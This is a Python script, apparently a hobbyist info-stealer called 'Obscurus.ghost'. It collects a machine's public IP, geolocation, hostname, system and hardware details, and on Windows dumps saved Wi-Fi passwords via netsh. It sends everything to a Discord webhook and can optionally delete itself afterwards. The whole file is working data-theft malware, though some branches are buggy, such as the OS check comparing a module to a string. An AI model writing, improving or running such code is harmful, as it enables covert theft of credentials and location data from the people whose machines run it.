import requests
import os
import sys
import datetime
import platform
import psutil
import socket
import netifaces
import subprocess

from datetime import date

#customization of behavior
ip_log = True
location_log = True
general_log = True
self_destruct = False
retry_request =  False
hardware_info = True

#FINISHED
#log location and other info
if location_log == True:
    req = requests.get("https://ipinfo.io/json")
    data = req.json()
    ip = data.get('ip')
    city = data.get('city')
    country = data.get('country')
    region = data.get('region')
    org = data.get('org')
    loc = data.get('loc')
    googlemap = "https://www.google.com/maps/search/google+map++" + loc
    location_info = (f""" 

    [-] City - {city}
    
    [-] Country - {country}

    [-] Region - {region}

    [-] Org - {org}

    [-] Loc - {loc}

    [-] Google - {googlemap}""")
else:
    location_info = ("Location info us turned OFF")

#WIP
#hardware logging
if os != "nt":
    hardware_log = ("Running linux, unable to get the info")
    pass
else:
    if hardware_info == True:
        cpufreq = psutil.cpu_freq()
        svmem = psutil.virtual_memory()
        partitions = psutil.disk_partitions()
        disk_io = psutil.disk_io_counters()
        net_io = psutil.net_io_counters()

        hardware_log = (f"""
    
        [-] Cpu Frequenci - {cpufreq}

        [-] Vram - {svmem} 

        [-] Partitions - {partitions}

        [-] Disks - {disk_io}

        [-] Net IO - {net_io}""")
    else:
        hardware_log = ("Hardware Info is turned OFF") 


#FINISHED, maybe add more stuff later
#general info

if general_log == True: 
    machine1 = platform.machine()
    version1 = platform.version()
    platform1 = platform.platform()
    uname1 = platform.uname()
    network_name = platform.node()
    python = platform.python_build()
    system1 = platform.system()
    process1 = platform.processor()
    computername = socket.gethostname()
    localipaddress = socket.gethostbyname(computername)
    date_of_extraction = date.today()
    general_info = (f""" 

    [-] Machine - {machine1}
                     
    [-] Version - {version1}

    [-] Platform - {platform1}

    [-] UserName - {uname1}

    [-] NetName - {network_name}

    [-] Python - {python}

    [-] System - {system1}

    [-] Processor - {process1}

    [-] PCname - {computername}

    [-] Date - {date_of_extraction}""")
else:
    general_info = ("Logging of general informations is turned OFF")

#FINISHED
#ip log
if ip_log == True:
    ip_info = (f"""
    [-] IP - {ip}

    [-] Local IP - {localipaddress}

    """)
else:
    ip_info = ("IP info is turned OFF")

#extracting wifi passwords
#FINISHED just debug
if os != ("nt"):
    b = ('Running linux, unable to get the info')
    pass
else: 
    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
    profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
    for i in profiles:
            results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
            results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]

#FINISHED
#the discord part

url='WEBHOOK_URL'

data_to_discord = {
}

#whole embed
data_to_discord["embeds"] = [
                {
                    'author': {
                        'name': f'Obscurus.ghost 1.1 \\ {date_of_extraction}'
                    },
                    'description': f'''Instance of Obscurus.ghost was ran, extracted data:''',
                    'fields': [
                        {
                            'name': 'PC informations ',
                            'value': f'''

                            {general_info}
                            
                            '''
                        },
                        {
                            'name': 'Hardware informations ',
                            'value': f'''

                            {hardware_log}
                            
                            '''
                        },
                        {
                            'name': 'Network informations ',
                            'value': f'''

                            {ip_info}
                            

                            '''
                        },
                        {
                            'name': 'Location ',
                            'value': f'''

                            {location_info}

                            ''',
                        },
                        {  #i need to add some sort of function to ignore wifi variable when on linux, but i am too dumb to do that :D
                            'name': "Credentials",
                            'value':f''' 
                            {b}
                           
                            ''',
                        }
                    ],
                    'footer': {
                        'text': '- Obscurus.ghost 1.1 \\ burnt.chipset@obscurus.network'
                    }
            }
]

result = requests.post(url, json = data_to_discord)

if retry_request == True:
    request_for_retry = (requests.post(url, json = data_to_discord))
    if result.status_code !=200:
        for x in request_for_retry:
            request_for_retry 
    else:
        pass
else: 
    pass
    

#SELF-DESTRUCT
if self_destruct == True:
    full_path = os.path.realpath(__file__)
    path, filename = os.path.split(full_path)
    os.remove(path + '/' + filename)
else: 
    pass
